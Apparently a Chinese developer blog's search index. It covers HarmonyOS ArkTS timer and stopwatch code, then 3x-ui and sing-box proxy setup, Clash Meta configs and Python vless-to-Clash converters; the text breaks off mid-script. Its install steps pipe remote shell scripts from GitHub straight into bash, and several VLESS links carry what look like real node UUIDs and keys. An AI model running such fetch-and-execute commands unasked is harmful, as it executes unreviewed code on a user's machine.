- 可以设置分钟和秒钟 倒计时显示 - 大字体显示剩余时间 进度条 - 环形进度条显示倒计时进度 控制按钮 - 开始、暂停、继续、重置功能 快捷设置 - 1分钟、5分钟、10分钟、30秒快捷按钮 完成提示 - 时间到时显示提醒\n技术特点： 使用ArkTS语言开发，符合API 17规范 响应式状态管理(@State装饰器) 生命周期管理(aboutToAppear/aboutToDisappear) 定时器管理(setInterval/clearInterval) 现代化UI设计，美观易用\n使用方法： 在分钟和秒钟输入框中设置时间 点击\u0026quot;开始\u0026quot;按钮启动定时器 可以随时暂停、继续或重置 使用快捷按钮快速设置常用时间 时间到达时会显示\u0026quot;时间到！\u0026ldquo;提示\n震动 添加权限\n//module.json5 //... \u0026#34;requestPermissions\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;ohos.permission.VIBRATE\u0026#34;, \u0026#34;reason\u0026#34;: \u0026#34;$string:vibrate_permission_reason\u0026#34;, \u0026#34;usedScene\u0026#34;: { \u0026#34;abilities\u0026#34;: [ \u0026#34;EntryAbility\u0026#34; ], \u0026#34;when\u0026#34;: \u0026#34;inuse\u0026#34; } } ] // 触发振动 triggerVibration() { try { // 使用正确的振动API调用，需要提供2个参数 vibrator.startVibration({ type: \u0026#39;time\u0026#39;, duration: 1000 }, { id: 0, usage: \u0026#39;notification\u0026#39; }); } catch (error) { console.error(\u0026#39;振动失败:\u0026#39;, error); } } Err Install Failed: error: failed to install bundle. code:9568289 error: install failed due to grant request permissions failed. 错误描述 在启动调试或运行应用/服务时，安装HAP出现错误，提示“error: install failed due to grant request permissions failed”错误信息。\n可能原因 默认应用等级为normal，只能使用normal等级的权限，如果使用了system_basic或system_core等级的权限，将导致报错。\n处理步骤 根据ACL签名指导为应用申请受限ACL权限。\nProfile https://developer.huawei.com/consumer/cn/doc/app/agc-help-debug-profile-0000002248181278\n一个应用最多可申请100个Profile文件 这很苹果 ，not only allpe can do !\nStopWatch @Entry @Component struct Index { @State elapsedTime: number = 0; // 已用时间（毫秒） @State isRunning: boolean = false; // 是否正在运行 @State laps: string[] = []; // 计圈记录 private intervalId: number = -1; // 定时器ID // 格式化时间显示 formatTime(milliseconds: number): string { const totalSeconds = Math.floor(milliseconds / 1000); const minutes = Math.floor(totalSeconds / 60); const seconds = totalSeconds % 60; const ms = Math.floor((milliseconds % 1000) / 10); return `${minutes.toString().padStart(2, \u0026#39;0\u0026#39;)}:${seconds.toString().padStart(2, \u0026#39;0\u0026#39;)}.${ms.toString().padStart(2, \u0026#39;0\u0026#39;)}`; } // 开始/暂停秒表 toggleStopwatch() { if (this.isRunning) { // 暂停 clearInterval(this.intervalId); this.isRunning = false; } else { // 开始 this.isRunning = true; const startTime = Date.now() - this.elapsedTime; this.intervalId = setInterval(() =\u0026gt; { this.elapsedTime = Date.now() - startTime; }, 10); } } // 重置秒表 resetStopwatch() { clearInterval(this.intervalId); this.isRunning = false; this.elapsedTime = 0; this.laps = []; } // 计圈 addLap() { if (this.isRunning) { const lapTime = this.formatTime(this.elapsedTime); this.laps.unshift(`计圈 ${this.laps.length + 1}: ${lapTime}`); } } build() { Column() { // 标题 Text(\u0026#39;秒表\u0026#39;) .fontSize(28) .fontWeight(FontWeight.Bold) .margin({ top: 40, bottom: 20 }) // 时间显示 Text(this.formatTime(this.elapsedTime)) .fontSize(48) .fontWeight(FontWeight.Bold) .fontColor(\u0026#39;#333333\u0026#39;) .margin({ bottom: 40 }) .fontFamily(\u0026#39;monospace\u0026#39;) // 按钮区域 Row() { // 开始/暂停按钮 Button(this.isRunning ? \u0026#39;暂停\u0026#39; : \u0026#39;开始\u0026#39;) .width(100) .height(50) .fontSize(18) .backgroundColor(this.isRunning ? \u0026#39;#FF6B6B\u0026#39; : \u0026#39;#4ECDC4\u0026#39;) .fontColor(Color.White) .onClick(() =\u0026gt; { this.toggleStopwatch(); }) Blank() // 计圈按钮 Button(\u0026#39;计圈\u0026#39;) .width(100) .height(50) .fontSize(18) .backgroundColor(\u0026#39;#95E1D3\u0026#39;) .fontColor(Color.White) .enabled(this.isRunning) .opacity(this.isRunning ? 1 : 0.5) .onClick(() =\u0026gt; { this.addLap(); }) Blank() // 重置按钮 Button(\u0026#39;重置\u0026#39;) .width(100) .height(50) .fontSize(18) .backgroundColor(\u0026#39;#FFA07A\u0026#39;) .fontColor(Color.White) .onClick(() =\u0026gt; { this.resetStopwatch(); }) } .width(\u0026#39;90%\u0026#39;) .margin({ bottom: 30 }) // 计圈记录 if (this.laps.length \u0026gt; 0) { Text(\u0026#39;计圈记录\u0026#39;) .fontSize(20) .fontWeight(FontWeight.Medium) .margin({ bottom: 15 }) List() { ForEach(this.laps, (lap: string, index: number) =\u0026gt; { ListItem() { Row() { Text(lap) .fontSize(16) .fontColor(\u0026#39;#666666\u0026#39;) } .width(\u0026#39;100%\u0026#39;) .padding({ left: 20, right: 20, top: 10, bottom: 10 }) .backgroundColor(index % 2 === 0 ? \u0026#39;#F8F8F8\u0026#39; : Color.White) } }) } .width(\u0026#39;90%\u0026#39;) .height(200) .backgroundColor(\u0026#39;#F0F0F0\u0026#39;) .borderRadius(8) } } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#39;#FAFAFA\u0026#39;) .justifyContent(FlexAlign.Start) .alignItems(HorizontalAlign.Center) } // 组件销毁时清理定时器 aboutToDisappear() { if (this.intervalId !== -1) { clearInterval(this.intervalId); } } } ","permalink":"https://qfsyso.github.io/posts/harmonyos-sdk17-timer/","summary":"targetSdkVersion HarmonyOS 5.0.5(API 17)\nTimer @Entry @Component struct Index { @State currentTime: string = \u0026#39;\u0026#39;; @State minutes: number = 0; @State seconds: number = 0; @State totalSeconds: number = 0; @State remainingSeconds: number = 0; @State isRunning: boolean = false; @State isPaused: boolean = false; @State isFinished: boolean = false; private timer: number = -1; private clockTimer: number = -1; aboutToAppear() { this.updateCurrentTime(); this.clockTimer = setInterval(() =\u0026gt; { this.updateCurrentTime(); }, 1000); } aboutToDisappear() { if (this.","title":"HarmonyOS SDK17 Timer"},{"content":"3x-ui 准备服务器\n系统推荐：Debian 11+/Ubuntu 20.04+\n确保服务器安全组已放行常用端口（80/443/自定义端口）。\n安装 3x-ui bash \u0026lt;(curl -Ls https://raw.githubusercontent.com/MHSanaei/3x-ui/master/install.sh) 安装过程中会提示：\n设置面板端口（默认 54321）\n设置登录用户名与密码\n启动与管理 # 启动 systemctl start x-ui # 停止 systemctl stop x-ui # 重启 systemctl restart x-ui # 查看状态 systemctl status x-ui 访问面板 在浏览器中打开：\nhttp://服务器IP:面板端口\n输入用户名和密码登录。\nHTTPS 证书配置（推荐） 3x-ui 自带 ACME，可以直接申请免费证书：\n确保域名已经解析到服务器 IP。\n在面板 → 设置 → 证书管理 → 申请证书。\n添加节点用户 登录面板后，可以添加 VLESS、VMess、Trojan 等协议的用户。\n面板会生成二维码和连接信息，方便客户端（比如 v2rayN、Clash）导入。\n常见问题 面板打不开：检查防火墙/安全组是否放行端口。\n证书申请失败：确认域名已解析，且 80/443 端口未被占用。\n更改面板端口：\nx-ui 在交互菜单里修改端口/用户密码。\nsockt5 入站列表\n创建代理socks5 UDP 端口 账户 密码\nClash 进入面板 打开 http://服务器IP:端口，登录管理后台。\n添加入站配置\n左侧菜单 → 入站列表 → 添加入站\n协议推荐：\nVLESS + TCP + TLS (Reality) （推荐安全）\n或 VLESS + WS + TLS（最常见，兼容性好）\n填写：\n端口（如 443、8443）\nUUID（随机生成即可）\nTLS 设置：勾选 TLS，并配置证书（可以在 3x-ui 申请证书，或上传已有证书）\nVLESS + WS + TLS 示例\nproxies: - name: \u0026#34;My-VLESS-WS\u0026#34; type: vless server: yourdomain.com port: 443 uuid: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx network: ws tls: true udp: true ws-opts: path: \u0026#34;/vless\u0026#34; headers: Host: yourdomain.com VLESS + Reality 示例\nproxies: - name: \u0026#34;My-VLESS-Reality\u0026#34; type: vless server: yourdomain.com port: 443 uuid: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx network: tcp reality-opts: public-key: your-reality-pubkey short-id: abc123 servername: www.lovelive-anime.jp # 伪装域名 udp: true python3 -m pip install pyyaml import urllib.parse import yaml def vless_to_clash(vless_url: str): # 解析 vless:// 链接 if not vless_url.startswith(\u0026#34;vless://\u0026#34;): raise ValueError(\u0026#34;不是 vless:// 链接\u0026#34;) # 拆分 url = vless_url[8:] user_info, rest = url.split(\u0026#34;@\u0026#34;, 1) uuid = user_info server_part, params_part = rest.split(\u0026#34;?\u0026#34;, 1) server, port = server_part.split(\u0026#34;:\u0026#34;) # 解析参数 params = dict(urllib.parse.parse_qsl(params_part.split(\u0026#34;#\u0026#34;)[0])) name = urllib.parse.unquote(rest.split(\u0026#34;#\u0026#34;)[-1]) if \u0026#34;#\u0026#34; in rest else \u0026#34;MyNode\u0026#34; # 构造 Clash 节点 node = { \u0026#34;name\u0026#34;: name, \u0026#34;type\u0026#34;: \u0026#34;vless\u0026#34;, \u0026#34;server\u0026#34;: server, \u0026#34;port\u0026#34;: int(port), \u0026#34;uuid\u0026#34;: uuid, \u0026#34;network\u0026#34;: params.get(\u0026#34;type\u0026#34;, \u0026#34;tcp\u0026#34;), \u0026#34;udp\u0026#34;: True } # TLS / Reality 参数 if params.get(\u0026#34;security\u0026#34;) == \u0026#34;reality\u0026#34;: node[\u0026#34;tls\u0026#34;] = True node[\u0026#34;flow\u0026#34;] = params.get(\u0026#34;flow\u0026#34;) node[\u0026#34;servername\u0026#34;] = params.get(\u0026#34;sni\u0026#34;) node[\u0026#34;client-fingerprint\u0026#34;] = params.get(\u0026#34;fp\u0026#34;, \u0026#34;chrome\u0026#34;) node[\u0026#34;reality-opts\u0026#34;] = { \u0026#34;public-key\u0026#34;: params.get(\u0026#34;pbk\u0026#34;, \u0026#34;\u0026#34;), \u0026#34;short-id\u0026#34;: params.get(\u0026#34;sid\u0026#34;, \u0026#34;\u0026#34;) } elif params.get(\u0026#34;security\u0026#34;) == \u0026#34;tls\u0026#34;: node[\u0026#34;tls\u0026#34;] = True node[\u0026#34;servername\u0026#34;] = params.get(\u0026#34;sni\u0026#34;) # WS 支持 if params.get(\u0026#34;type\u0026#34;) == \u0026#34;ws\u0026#34;: node[\u0026#34;ws-opts\u0026#34;] = { \u0026#34;path\u0026#34;: params.get(\u0026#34;path\u0026#34;, \u0026#34;/\u0026#34;), \u0026#34;headers\u0026#34;: {\u0026#34;Host\u0026#34;: params.get(\u0026#34;host\u0026#34;, server)} } return node if __name__ == \u0026#34;__main__\u0026#34;: # 示例 VLESS 链接 vless_link = \u0026#34;vless://df513d45-d0e0-454d-b0c0-6707c5eeb295@185.242.0.1:443?type=tcp\u0026amp;security=reality\u0026amp;pbk=xxxxxx\u0026amp;flow=xtls-rprx-vision\u0026amp;sni=www.lovelive-anime.jp\u0026amp;fp=chrome#MyNode\u0026#34; node = vless_to_clash(vless_link) clash_config = { \u0026#34;proxies\u0026#34;: [node], \u0026#34;proxy-groups\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Proxy\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [node[\u0026#34;name\u0026#34;], \u0026#34;DIRECT\u0026#34;] } ] } print(yaml.dump(clash_config, sort_keys=False, allow_unicode=True)) 可得到 .yaml 导入 clash 即可使用\n支持多条vless import urllib.parse import yaml def vless_to_clash(vless_url: str): \u0026#34;\u0026#34;\u0026#34;将单条 vless:// 链接转换为 Clash 节点配置\u0026#34;\u0026#34;\u0026#34; if not vless_url.startswith(\u0026#34;vless://\u0026#34;): raise ValueError(\u0026#34;不是 vless:// 链接\u0026#34;) url = vless_url[8:] user_info, rest = url.split(\u0026#34;@\u0026#34;, 1) uuid = user_info server_part, params_part = rest.split(\u0026#34;?\u0026#34;, 1) server, port = server_part.split(\u0026#34;:\u0026#34;) params, name = params_part, \u0026#34;MyNode\u0026#34; if \u0026#34;#\u0026#34; in params_part: params, name = params_part.split(\u0026#34;#\u0026#34;, 1) name = urllib.parse.unquote(name) # 解析参数 params = dict(urllib.parse.parse_qsl(params)) node = { \u0026#34;name\u0026#34;: name, \u0026#34;type\u0026#34;: \u0026#34;vless\u0026#34;, \u0026#34;server\u0026#34;: server, \u0026#34;port\u0026#34;: int(port), \u0026#34;uuid\u0026#34;: uuid, \u0026#34;network\u0026#34;: params.get(\u0026#34;type\u0026#34;, \u0026#34;tcp\u0026#34;), \u0026#34;udp\u0026#34;: True } # TLS / Reality if params.get(\u0026#34;security\u0026#34;) == \u0026#34;reality\u0026#34;: node[\u0026#34;tls\u0026#34;] = True node[\u0026#34;flow\u0026#34;] = params.get(\u0026#34;flow\u0026#34;) node[\u0026#34;servername\u0026#34;] = params.get(\u0026#34;sni\u0026#34;) node[\u0026#34;client-fingerprint\u0026#34;] = params.get(\u0026#34;fp\u0026#34;, \u0026#34;chrome\u0026#34;) node[\u0026#34;reality-opts\u0026#34;] = { \u0026#34;public-key\u0026#34;: params.get(\u0026#34;pbk\u0026#34;, \u0026#34;\u0026#34;), \u0026#34;short-id\u0026#34;: params.get(\u0026#34;sid\u0026#34;, \u0026#34;\u0026#34;) } elif params.get(\u0026#34;security\u0026#34;) == \u0026#34;tls\u0026#34;: node[\u0026#34;tls\u0026#34;] = True node[\u0026#34;servername\u0026#34;] = params.get(\u0026#34;sni\u0026#34;) # WS 支持 if params.get(\u0026#34;type\u0026#34;) == \u0026#34;ws\u0026#34;: node[\u0026#34;ws-opts\u0026#34;] = { \u0026#34;path\u0026#34;: params.get(\u0026#34;path\u0026#34;, \u0026#34;/\u0026#34;), \u0026#34;headers\u0026#34;: {\u0026#34;Host\u0026#34;: params.get(\u0026#34;host\u0026#34;, server)} } return node if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;请输入 VLESS 链接（支持多条，回车换行，输入空行结束）：\u0026#34;) links = [] while True: line = input().strip() if not line: break links.append(line) proxies = [] for link in links: try: node = vless_to_clash(link) proxies.append(node) except Exception as e: print(f\u0026#34;❌ 无法解析: {link} -\u0026gt; {e}\u0026#34;) if not proxies: print(\u0026#34;没有生成任何节点配置！\u0026#34;) exit(1) # 构造完整 Clash 配置 clash_config = { \u0026#34;proxies\u0026#34;: proxies, \u0026#34;proxy-groups\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Proxy\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [p[\u0026#34;name\u0026#34;] for p in proxies] + [\u0026#34;DIRECT\u0026#34;] } ] } with open(\u0026#34;config.yaml\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: yaml.dump(clash_config, f, sort_keys=False, allow_unicode=True) print(\u0026#34;✅ 已生成 config.yaml，可以直接导入 Clash Meta 使用\u0026#34;) 运行脚本：\npython3 app.py 按提示输入多条 VLESS 链接，例如：\nvless://uuid1@1.1.1.1:443?type=tcp\u0026amp;security=reality\u0026amp;pbk=xxxx\u0026amp;sni=example.com#Node1 vless://uuid2@2.2.2.2:8443?type=ws\u0026amp;security=tls\u0026amp;host=example.org\u0026amp;path=/ws#Node2 输入完成后，直接 回车两次结束。\n脚本会生成一个 config.yaml 文件，内容里包含所有节点和一个代理组。\nSb 安装\nbash \u0026lt;(wget -qO- -o- https://github.com/233boy/sing-box/raw/main/install.sh) 创建一个vless+vision+reality的节点\nvless://b1635293-86f6-4b90-ac6c-c56f0c9e19dd@185.1.0.1:20887?encryption=none\u0026amp;security=reality\u0026amp;flow=xtls-rprx-vision\u0026amp;type=tcp\u0026amp;sni=aws.amazon.com\u0026amp;pbk=uiYgNR88C0mQAU9-n39rVt_pnYCB-UV0sRiE3aDKcRQ\u0026amp;fp=chrome#233boy-reality-185.1.0.1 关注(tg): https://t.me/tg2333 文档(doc): https://233boy.com/sing-box/sing-box-script/\n在命令行中输入【sb】，启动脚本。\n选择【1）添加配置】。\n选择【12）vless+ws+tls】。 输入域名\nOR\nVLESS-REALITY vless://6b8c9df4-cae0-422f-ade1-3295a1aaeffe@185.1.0.1:110?encryption=none\u0026amp;security=reality\u0026amp;flow=xtls-rprx-vision\u0026amp;type=tcp\u0026amp;sni=www.cloudflare.com\u0026amp;pbk=PQ-iBZxWiKx7uY5xaXHJbCKxRFH_twOU_fAEwRVT-n0\u0026amp;fp=chrome#233boy-reality-185.1.0.1 # ========================= # Clash Meta 配置 # 基于：VLESS Reality + TCP + Vision # ========================= mixed-port: 7890 allow-lan: true mode: rule log-level: info ipv6: false external-controller: 127.0.0.1:9090 profile: store-selected: true store-fake-ip: true geodata-mode: true geodata-loader: memconservative geo-update-interval: 24 dns: enable: true listen: 0.0.0.0:1053 ipv6: false enhanced-mode: fake-ip fake-ip-range: 198.18.0.1/16 use-hosts: true nameserver: - 223.5.5.5 - 1.1.1.1 fallback: - 8.8.8.8 - 9.9.9.9 fallback-filter: geoip: true ipcidr: - 240.0.0.0/4 fake-ip-filter: - \u0026#39;*.lan\u0026#39; - localhost - \u0026#39;*.local\u0026#39; - \u0026#39;time.*.com\u0026#39; - \u0026#39;time.*.gov\u0026#39; - \u0026#39;ntp.*.*\u0026#39; - \u0026#39;music.163.com\u0026#39; - \u0026#39;*.msftconnecttest.com\u0026#39; - \u0026#39;*.msftncsi.com\u0026#39; proxies: - name: 233boy-reality-185.1.0.1 type: vless server: 185.1.0.1 port: 110 uuid: 6b8c9df4-cae0-422f-ade1-3295a1aaeffe udp: true # Reality / TLS tls: true servername: www.cloudflare.com reality-opts: public-key: PQ-iBZxWiKx7uY5xaXHJbCKxRFH_twOU_fAEwRVT-n0 short-id: \u0026#34;\u0026#34; # 如果服务端有 short-id，请填入 flow: xtls-rprx-vision # uTLS（指纹） client-fingerprint: chrome # 传输层：TCP network: tcp proxy-groups: - name: 🚀 节点选择 type: select proxies: - 233boy-reality-185.1.0.1 - DIRECT - name: 🌍 国外流量 type: select proxies: - 🚀 节点选择 - DIRECT - name: 🍎 Apple type: select proxies: - DIRECT - 🚀 节点选择 - name: 🎯 全球直连 type: select proxies: - DIRECT - 🚀 节点选择 rules: - DOMAIN,localhost,DIRECT - GEOIP,CN,🎯 全球直连 - MATCH,🌍 国外流量 vless2clash # vless2clash.py import re import sys import urllib.parse import yaml # 模板 base_config = { \u0026#34;mixed-port\u0026#34;: 7890, \u0026#34;allow-lan\u0026#34;: True, \u0026#34;mode\u0026#34;: \u0026#34;rule\u0026#34;, \u0026#34;log-level\u0026#34;: \u0026#34;info\u0026#34;, \u0026#34;ipv6\u0026#34;: False, \u0026#34;external-controller\u0026#34;: \u0026#34;127.0.0.1:9090\u0026#34;, \u0026#34;profile\u0026#34;: { \u0026#34;store-selected\u0026#34;: True, \u0026#34;store-fake-ip\u0026#34;: True, }, \u0026#34;geodata-mode\u0026#34;: True, \u0026#34;geodata-loader\u0026#34;: \u0026#34;memconservative\u0026#34;, \u0026#34;geo-update-interval\u0026#34;: 24, \u0026#34;dns\u0026#34;: { \u0026#34;enable\u0026#34;: True, \u0026#34;listen\u0026#34;: \u0026#34;0.0.0.0:1053\u0026#34;, \u0026#34;ipv6\u0026#34;: False, \u0026#34;enhanced-mode\u0026#34;: \u0026#34;fake-ip\u0026#34;, \u0026#34;fake-ip-range\u0026#34;: \u0026#34;198.18.0.1/16\u0026#34;, \u0026#34;use-hosts\u0026#34;: True, \u0026#34;nameserver\u0026#34;: [\u0026#34;223.5.5.5\u0026#34;, \u0026#34;1.1.1.1\u0026#34;], \u0026#34;fallback\u0026#34;: [\u0026#34;8.8.8.8\u0026#34;, \u0026#34;9.9.9.9\u0026#34;], \u0026#34;fallback-filter\u0026#34;: { \u0026#34;geoip\u0026#34;: True, \u0026#34;ipcidr\u0026#34;: [\u0026#34;240.0.0.0/4\u0026#34;] }, \u0026#34;fake-ip-filter\u0026#34;: [ \u0026#34;*.lan\u0026#34;, \u0026#34;localhost\u0026#34;, \u0026#34;*.local\u0026#34;, \u0026#34;time.*.com\u0026#34;, \u0026#34;time.*.gov\u0026#34;, \u0026#34;ntp.*.*\u0026#34;, \u0026#34;music.163.com\u0026#34;, \u0026#34;*.msftconnecttest.com\u0026#34;, \u0026#34;*.msftncsi.com\u0026#34; ] }, \u0026#34;proxies\u0026#34;: [], \u0026#34;proxy-groups\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;🚀 节点选择\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [] }, { \u0026#34;name\u0026#34;: \u0026#34;🌍 国外流量\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [\u0026#34;🚀 节点选择\u0026#34;, \u0026#34;DIRECT\u0026#34;] }, { \u0026#34;name\u0026#34;: \u0026#34;🍎 Apple\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [\u0026#34;DIRECT\u0026#34;, \u0026#34;🚀 节点选择\u0026#34;] }, { \u0026#34;name\u0026#34;: \u0026#34;🎯 全球直连\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [\u0026#34;DIRECT\u0026#34;, \u0026#34;🚀 节点选择\u0026#34;] } ], \u0026#34;rules\u0026#34;: [ \u0026#34;DOMAIN,localhost,DIRECT\u0026#34;, \u0026#34;GEOIP,CN,🎯 全球直连\u0026#34;, \u0026#34;MATCH,🌍 国外流量\u0026#34; ] } def parse_vless(url: str): if not url.startswith(\u0026#34;vless://\u0026#34;): raise ValueError(\u0026#34;不是 VLESS 链接\u0026#34;) # 去掉 vless:// raw = url[8:] # 分离 #tag if \u0026#34;#\u0026#34; in raw: raw, tag = raw.split(\u0026#34;#\u0026#34;, 1) name = urllib.parse.unquote(tag) else: name = \u0026#34;VLESS-Node\u0026#34; # 分离 ?参数 if \u0026#34;?\u0026#34; in raw: raw, query = raw.split(\u0026#34;?\u0026#34;, 1) params = dict(urllib.parse.parse_qsl(query)) else: params = {} # userinfo@host:port userinfo, serverinfo = raw.split(\u0026#34;@\u0026#34;) uuid = userinfo server, port = serverinfo.split(\u0026#34;:\u0026#34;) # 生成 clash proxy 节点 proxy = { \u0026#34;name\u0026#34;: name, \u0026#34;type\u0026#34;: \u0026#34;vless\u0026#34;, \u0026#34;server\u0026#34;: server, \u0026#34;port\u0026#34;: int(port), \u0026#34;uuid\u0026#34;: uuid, \u0026#34;udp\u0026#34;: True, \u0026#34;tls\u0026#34;: True, \u0026#34;servername\u0026#34;: params.get(\u0026#34;sni\u0026#34;, \u0026#34;\u0026#34;), \u0026#34;reality-opts\u0026#34;: { \u0026#34;public-key\u0026#34;: params.get(\u0026#34;pbk\u0026#34;, \u0026#34;\u0026#34;), \u0026#34;short-id\u0026#34;: params.get(\u0026#34;sid\u0026#34;, \u0026#34;\u0026#34;) or \u0026#34;\u0026#34; }, \u0026#34;client-fingerprint\u0026#34;: params.get(\u0026#34;fp\u0026#34;, \u0026#34;chrome\u0026#34;), \u0026#34;network\u0026#34;: params.get(\u0026#34;type\u0026#34;, \u0026#34;tcp\u0026#34;) } flow = params.get(\u0026#34;flow\u0026#34;, \u0026#34;\u0026#34;) if flow: proxy[\u0026#34;flow\u0026#34;] = flow # network-specific if proxy[\u0026#34;network\u0026#34;] == \u0026#34;h2\u0026#34;: proxy[\u0026#34;h2-opts\u0026#34;] = { \u0026#34;host\u0026#34;: [params.get(\u0026#34;sni\u0026#34;, \u0026#34;\u0026#34;)], \u0026#34;path\u0026#34;: \u0026#34;/\u0026#34; } return proxy def vless_to_config(url: str, outfile=\u0026#34;config.yaml\u0026#34;): config = base_config.copy() proxy = parse_vless(url) config[\u0026#34;proxies\u0026#34;] = [proxy] config[\u0026#34;proxy-groups\u0026#34;][0][\u0026#34;proxies\u0026#34;] = [proxy[\u0026#34;name\u0026#34;], \u0026#34;DIRECT\u0026#34;] with open(outfile, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: yaml.dump(config, f, allow_unicode=True, sort_keys=False) print(f\u0026#34;✅ 已生成 {outfile}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) \u0026lt; 2: print(\u0026#34;用法: python vless2clash.py \u0026lt;vless链接\u0026gt;\u0026#34;) else: vless_url = sys.argv[1] vless_to_config(vless_url) 安装依赖：\npip install pyyaml 运行：\npython vless2clash.py \u0026#34;vless://6b8c9df4-xxxx-xxxx@srv:110?...#我的节点\u0026#34; 在当前目录生成 config.yaml，直接导入 Clash Meta for Android 即可。\ntxttoyaml import sys import urllib.parse import yaml # ======================= # 基础 Clash Meta 模板 # ======================= base_config = { \u0026#34;mixed-port\u0026#34;: 7890, \u0026#34;allow-lan\u0026#34;: True, \u0026#34;mode\u0026#34;: \u0026#34;rule\u0026#34;, \u0026#34;log-level\u0026#34;: \u0026#34;info\u0026#34;, \u0026#34;ipv6\u0026#34;: False, \u0026#34;external-controller\u0026#34;: \u0026#34;127.0.0.1:9090\u0026#34;, \u0026#34;profile\u0026#34;: { \u0026#34;store-selected\u0026#34;: True, \u0026#34;store-fake-ip\u0026#34;: True, }, \u0026#34;geodata-mode\u0026#34;: True, \u0026#34;geodata-loader\u0026#34;: \u0026#34;memconservative\u0026#34;, \u0026#34;geo-update-interval\u0026#34;: 24, \u0026#34;dns\u0026#34;: { \u0026#34;enable\u0026#34;: True, \u0026#34;listen\u0026#34;: \u0026#34;0.0.0.0:1053\u0026#34;, \u0026#34;ipv6\u0026#34;: False, \u0026#34;enhanced-mode\u0026#34;: \u0026#34;fake-ip\u0026#34;, \u0026#34;fake-ip-range\u0026#34;: \u0026#34;198.18.0.1/16\u0026#34;, \u0026#34;use-hosts\u0026#34;: True, \u0026#34;nameserver\u0026#34;: [\u0026#34;223.5.5.5\u0026#34;, \u0026#34;1.1.1.1\u0026#34;], \u0026#34;fallback\u0026#34;: [\u0026#34;8.8.8.8\u0026#34;, \u0026#34;9.9.9.9\u0026#34;], \u0026#34;fallback-filter\u0026#34;: { \u0026#34;geoip\u0026#34;: True, \u0026#34;ipcidr\u0026#34;: [\u0026#34;240.0.0.0/4\u0026#34;] }, \u0026#34;fake-ip-filter\u0026#34;: [ \u0026#34;*.lan\u0026#34;, \u0026#34;localhost\u0026#34;, \u0026#34;*.local\u0026#34;, \u0026#34;time.*.com\u0026#34;, \u0026#34;time.*.gov\u0026#34;, \u0026#34;ntp.*.*\u0026#34;, \u0026#34;music.163.com\u0026#34;, \u0026#34;*.msftconnecttest.com\u0026#34;, \u0026#34;*.msftncsi.com\u0026#34; ] }, \u0026#34;proxies\u0026#34;: [], \u0026#34;proxy-groups\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;🚀 节点选择\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [] }, { \u0026#34;name\u0026#34;: \u0026#34;🌍 国外流量\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [\u0026#34;🚀 节点选择\u0026#34;, \u0026#34;DIRECT\u0026#34;] }, { \u0026#34;name\u0026#34;: \u0026#34;🍎 Apple\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [\u0026#34;DIRECT\u0026#34;, \u0026#34;🚀 节点选择\u0026#34;] }, { \u0026#34;name\u0026#34;: \u0026#34;🎯 全球直连\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;select\u0026#34;, \u0026#34;proxies\u0026#34;: [\u0026#34;DIRECT\u0026#34;, \u0026#34;🚀 节点选择\u0026#34;] } ], \u0026#34;rules\u0026#34;: [ \u0026#34;DOMAIN,localhost,DIRECT\u0026#34;, \u0026#34;GEOIP,CN,🎯 全球直连\u0026#34;, \u0026#34;MATCH,🌍 国外流量\u0026#34; ] } def parse_vless(url: str): \u0026#34;\u0026#34;\u0026#34;解析 vless:// 链接为 Clash Meta 节点\u0026#34;\u0026#34;\u0026#34; if not url.startswith(\u0026#34;vless://\u0026#34;): raise ValueError(\u0026#34;不是 VLESS 链接\u0026#34;) raw = url[8:] if \u0026#34;#\u0026#34; in raw: raw, tag = raw.split(\u0026#34;#\u0026#34;, 1) name = urllib.parse.unquote(tag) else: name = \u0026#34;VLESS-Node\u0026#34; if \u0026#34;?\u0026#34; in raw: raw, query = raw.split(\u0026#34;?\u0026#34;, 1) params = dict(urllib.parse.parse_qsl(query)) else: params = {} userinfo, serverinfo = raw.split(\u0026#34;@\u0026#34;) uuid = userinfo server, port = serverinfo.split(\u0026#34;:\u0026#34;) proxy = { \u0026#34;name\u0026#34;: name, \u0026#34;type\u0026#34;: \u0026#34;vless\u0026#34;, \u0026#34;server\u0026#34;: server, \u0026#34;port\u0026#34;: int(port), \u0026#34;uuid\u0026#34;: uuid, \u0026#34;udp\u0026#34;: True, \u0026#34;tls\u0026#34;: True, \u0026#34;servername\u0026#34;: params.get(\u0026#34;sni\u0026#34;, \u0026#34;\u0026#34;), \u0026#34;reality-opts\u0026#34;: { \u0026#34;public-key\u0026#34;: params.get(\u0026#34;pbk\u0026#34;, \u0026#34;\u0026#34;), \u0026#34;short-id\u0026#34;: params.get(\u0026#34;sid\u0026#34;, \u0026#34;\u0026#34;) or \u0026#34;\u0026#34; }, \u0026#34;client-fingerprint\u0026#34;: params.get(\u0026#34;fp\u0026#34;, \u0026#34;chrome\u0026#34;), \u0026#34;network\u0026#34;: params.get(\u0026#34;type\u0026#34;, 